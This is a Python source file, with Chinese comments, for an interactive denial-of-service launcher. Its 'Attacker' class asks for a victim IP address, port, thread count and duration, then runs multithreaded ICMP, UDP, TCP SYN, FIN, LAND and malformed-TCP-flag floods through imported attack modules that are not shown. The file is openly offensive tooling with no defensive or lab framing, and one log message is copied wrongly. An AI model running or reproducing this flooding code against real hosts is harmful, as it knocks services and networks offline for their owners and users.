if __name__ == "__main__":
    import sys

    sys.path.append("../")
from interact_module import questions as qm
from interact_module import different_types as dtm
from PyInquirer import prompt
from concurrent.futures import ThreadPoolExecutor, wait
from attack_means.different_attacks import icmp_flood_attack as ifam, land_attack as lam, syn_flood_attack as sfam, \
    udp_flood_attack as ufam
from attack_means.different_attacks import fin_flood_attack as ffam
from attack_means.different_attacks import tcp_flags_attack as tfam
from attack_means import tools as tm
from multiprocessing import Queue
from loguru import logger


class Attacker:
    def __init__(self):
        self.number_of_threads = None
        self.attack_method = None
        self.local_ip_address = None
        self.victim_ip_address = None
        self.attack_time = None
        self.get_attack_method()
        self.get_number_of_threads()
        self.get_local_ip_address()
        self.get_victim_ip_address()
        self.get_attack_time()
        self.handle_different_attack_types()

    def get_local_ip_address(self):
        self.local_ip_address = tm.Tools.get_local_ip_address()

    def get_victim_ip_address(self):
        self.victim_ip_address = prompt(qm.QUESTION_FOR_ATTACK_DESTINATION)["destination"]

    def get_attack_time(self):
        self.attack_time = int(prompt(qm.QUESTION_FOR_ATTACK_TIME)["duration"])

    def get_number_of_threads(self):
        """
        进行攻击线程数量的选择
        :return:
        """
        self.number_of_threads = int(prompt(qm.QUESTION_FOR_NUMBER_OF_ATTACK_THREADS)["number_of_threads"])

    def get_attack_method(self):
        """
        进行攻击类型的选择
        :return:
        """
        user_selected_method = prompt(qm.QUESTION_FOR_ATTACK_METHOD_SELECTION)["method"]
        if user_selected_method == "icmp_flood_attack":
            self.attack_method = dtm.AttackTypes.ICMP_FLOOD_ATTACK
        elif user_selected_method == "udp_flood_attack":
            self.attack_method = dtm.AttackTypes.UDP_FLOOD_ATTACK
        elif user_selected_method == "tcp_syn_flood":
            self.attack_method = dtm.AttackTypes.TCP_SYN_FLOOD
        elif user_selected_method == "land_attack":
            self.attack_method = dtm.AttackTypes.LAND_ATTACK
        elif user_selected_method == "tcp_flags_attack":
            self.attack_method = dtm.AttackTypes.TCP_FLAGS_ATTACK
        elif user_selected_method == "fin_flood_attack":
            self.attack_method = dtm.AttackTypes.FIN_FLOOD_ATTACK
        else:
            raise ValueError("unsupported attack type")

    def handle_different_attack_types(self):
        if self.attack_method == dtm.AttackTypes.ICMP_FLOOD_ATTACK:
            self.icmp_flood_attack()
        elif self.attack_method == dtm.AttackTypes.UDP_FLOOD_ATTACK:
            self.udp_flood_attack()
        elif self.attack_method == dtm.AttackTypes.TCP_SYN_FLOOD:
            self.tcp_syn_flood()
        elif self.attack_method == dtm.AttackTypes.LAND_ATTACK:
            self.land_attack()
        elif self.attack_method == dtm.AttackTypes.TCP_FLAGS_ATTACK:
            self.tcp_flags_attack()
        elif self.attack_method == dtm.AttackTypes.FIN_FLOOD_ATTACK:
            self.fin_flood_attack()
        else:
            raise ValueError("unsupported attack type")

    def fin_flood_attack(self):
        source_ip = input("请输入源地址:")
        source_port = int(input("请输入源端口:"))
        target_ip = input("请输入目的地址:")
        target_port = int(input("请输入目的端口:"))
        with ThreadPoolExecutor(max_workers=self.number_of_threads) as executor:
            # 停止信号
            stop_signal_queue = Queue(maxsize=1)
            # 结果列表
            future_list = []
            # 进行任务的提交
            for index in range(self.number_of_threads):
                future = executor.submit(ffam.FinFloodAttack.send_tcp_packets_with_fin_set, source_ip,
                                         source_port, target_ip, target_port, stop_signal_queue)
                future_list.append(future)
            # 阻塞直到超时
            wait(future_list, timeout=self.attack_time)
            # 超时之后向队列之中存放一个元素，各个线程check自身队列的时候发现非空，就退出了
            stop_signal_queue.put(1)
        logger.success("icmp flood attack complete")

    def icmp_flood_attack(self):
        payload_size = self.get_icmp_packet_payload_size()
        with ThreadPoolExecutor(max_workers=self.number_of_threads) as executor:
            # 停止信号
            stop_signal_queue = Queue(maxsize=1)
            # 结果列表
            future_list = []
            # 进行任务的提交
            for index in range(self.number_of_threads):
                future = executor.submit(ifam.IcmpFloodAttack.send_icmp_packets, self.local_ip_address,
                                         self.victim_ip_address, payload_size, stop_signal_queue)
                future_list.append(future)
            # 阻塞直到超时
            wait(future_list, timeout=self.attack_time)
            # 超时之后向队列之中存放一个元素，各个线程check自身队列的时候发现非空，就退出了
            stop_signal_queue.put(1)
        logger.success("icmp flood attack complete")

    def udp_flood_attack(self):
        # 获取目的端口
        destination_port = self.get_destination_port()
        with ThreadPoolExecutor(max_workers=self.number_of_threads) as executor:
            # 停止信号
            stop_signal_queue = Queue(maxsize=1)
            # 结果列表
            future_list = []
            # 进行任务的提交
            for index in range(self.number_of_threads):
                future = executor.submit(ufam.UdpFloodAttack.send_udp_packets, self.victim_ip_address,
                                         destination_port, stop_signal_queue)
                future_list.append(future)
            # 阻塞直到超时
            wait(future_list, timeout=self.attack_time)
            # 超时之后向队列之中存放一个元素，各个线程check自身队列的时候发现非空，就退出了
            stop_signal_queue.put(1)
        logger.success("udp flood attack complete")

    def tcp_syn_flood(self):
        destination_port = self.get_destination_port()
        with ThreadPoolExecutor(max_workers=self.number_of_threads) as executor:
            # 停止信号
            stop_signal_queue = Queue(maxsize=1)
            # 结果列表
            future_list = []
            # 进行任务的提交
            for index in range(self.number_of_threads):
                future = executor.submit(sfam.SynFloodAttack.send_flood_syn_packets, self.local_ip_address, self.victim_ip_address, destination_port, stop_signal_queue)
                future_list.append(future)
            # 阻塞直到超时
            wait(future_list, timeout=self.attack_time)
            # 超时之后向队列之中存放一个元素，各个线程check自身队列的时候发现非空，就退出了
            stop_signal_queue.put(1)
        logger.success("tcp syn flood attack complete")

    def land_attack(self):
        destination_port = self.get_destination_port()
        with ThreadPoolExecutor(max_workers=self.number_of_threads) as executor:
            # 停止信号
            stop_signal_queue = Queue(maxsize=1)
            # 结果列表
            future_list = []
            # 进行任务的提交
            for index in range(self.number_of_threads):
                future = executor.submit(lam.LandAttack.send_land_attack_packets, self.victim_ip_address, destination_port, stop_signal_queue)
                future_list.append(future)
            # 阻塞直到超时
            wait(future_list, timeout=self.attack_time)
            # 超时之后向队列之中存放一个元素，各个线程check自身队列的时候发现非空，就退出了
            stop_signal_queue.put(1)
        logger.success("tcp land attack complete")

    def tcp_flags_attack(self):
        destination_port = self.get_destination_port()
        with ThreadPoolExecutor(max_workers=self.number_of_threads) as executor:
            # 停止信号
            stop_signal_queue = Queue(maxsize=1)
            # 结果列表
            future_list = []
            # 进行任务的提交
            for index in range(self.number_of_threads):
                future = executor.submit(tfam.TcpFlagsAttack.send_tcp_packets_with_wrong_flags, self.local_ip_address, self.victim_ip_address,
                                         destination_port, stop_signal_queue)
                future_list.append(future)
            # 阻塞直到超时
            wait(future_list, timeout=self.attack_time)
            # 超时之后向队列之中存放一个元素，各个线程check自身队列的时候发现非空，就退出了
            stop_signal_queue.put(1)
        logger.success("tcp flags attack complete")

    def get_icmp_packet_payload_size(self):
        """
        获取 ICMP payload 部分的大小
        :return:
        """
        payload_size = int(prompt(qm.QUESTION_FOR_PACKET_SIZE)["packet_size"])
        return payload_size

    def get_destination_port(self):
        """
        获取目的端口
        :return:
        """
        destination_port = int(prompt(qm.QUESTION_FOR_DESTINATION_PORT)["port"])
        return destination_port


if __name__ == "__main__":
    attacker = Attacker()
